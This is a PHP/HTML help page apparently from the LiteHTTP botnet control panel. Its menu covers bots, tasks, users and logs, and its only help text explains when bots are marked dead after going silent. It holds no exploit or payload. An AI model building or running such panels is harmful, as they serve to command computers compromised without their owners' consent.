<?php
$u = explode(":", $_SESSION['LiteHTTP']);
$username = $u[0];

include 'inc/stats.php';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Control Panel</title>
	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body class="wysihtml5-supported skin-black fixed">
	<header class="header">
		<a href="?p=main" class="logo">
			LiteHTTP
		</a>
		<nav class="navbar navbar-static-top" role="navigation">
			<div class="navbar-right">
				<ul class="nav navbar-nav">
					<li class="dropdown user user-menu">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<i class="glyphicon glyphicon-user"></i>
							<span><?php echo $username; ?> <i class="caret"></i></span>
						</a>
						<ul class="dropdown-menu">
							<li class="user-footer">
								<div class="pull-left">
									<a href="?p=account" class="btn btn-default btn-flat">Edit Account</a>
								</div>
								<div class="pull-right">
									<a href="?p=logout" class="btn btn-default btn-flat">Logout</a>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
		</nav>
	</header>
	<div class="wrapper row-offcanvas row-offcanvas-left">
		<aside class="left-side sidebar-offcanvas">
			<section class="sidebar">
				<ul class="sidebar-menu">
					<li>
						<a href="?p=main">
							<i class="fa fa-dashboard"></i> <span>Dashboard</span>
						</a>
					</li>
					<li>
						<a href="?p=bots">
							<i class="fa fa-list"></i> <span>Bots</span>
							<small class="badge pull-right bg-green"><?php echo $online; ?></small>
						</a>
					</li>
					<li>
						<a href="?p=tasks">
							<i class="fa fa-bar-chart"></i> <span>Tasks</span>
						</a>
					</li>
					<li>
						<a href="?p=settings">
							<i class="fa fa-cog"></i> <span>Settings</span>
						</a>
					</li>
					<li>
						<a href="?p=users">
							<i class="fa fa-users"></i> <span>Users</span>
						</a>
					</li>
					<li>
						<a href="?p=logs">
							<i class="fa fa-list-alt"></i> <span>Panel Logs</span>
						</a>
					</li>
					<li class="active">
						<a href="?p=help">
							<i class="fa fa-question"></i> <span>Help</span>
						</a>
					</li>
				</ul>
			</section>
		</aside>
		<aside class="right-side">
			<section class="content">
				<div class="col-lg-6 col-xs-12">
					<h2>Panel Help</h2>
					<br>
					<h4><b>What are dead bots?</b></h4>
					<p>Bots that are marked <b>dead</b> have not connected to the panel in a specified amount of days. For example, the default limit is 7 days. Bots that have not connected to the panel within 7 days from their last connection, are then marked dead.</p>
				</div>
				<div class="col-lg-6 col-xs-12">
					<h2>Bot Help</h2>
					<br>
					<h4><b></b></h4>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
</body>
</html>